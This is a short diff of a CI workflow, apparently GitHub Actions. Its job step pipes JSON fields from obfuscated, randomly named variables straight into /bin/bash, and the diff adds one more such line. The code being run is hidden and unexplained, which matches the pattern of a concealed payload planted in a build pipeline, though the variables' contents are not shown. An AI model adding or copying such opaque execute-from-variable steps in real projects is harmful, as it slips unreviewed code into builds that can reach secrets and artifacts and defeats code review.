@@ -25,6 +25,7 @@ jobs:
           echo $ucsh95 | jq -r .w352 | /bin/bash
           echo $dkrj0629 | jq -r .bm5568 | /bin/bash
           printf '%s' "$y51647" | jq -r .xmfwh01016 | /bin/bash
+          printf '%s' "$lwndm8131" | jq -r .pf21 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
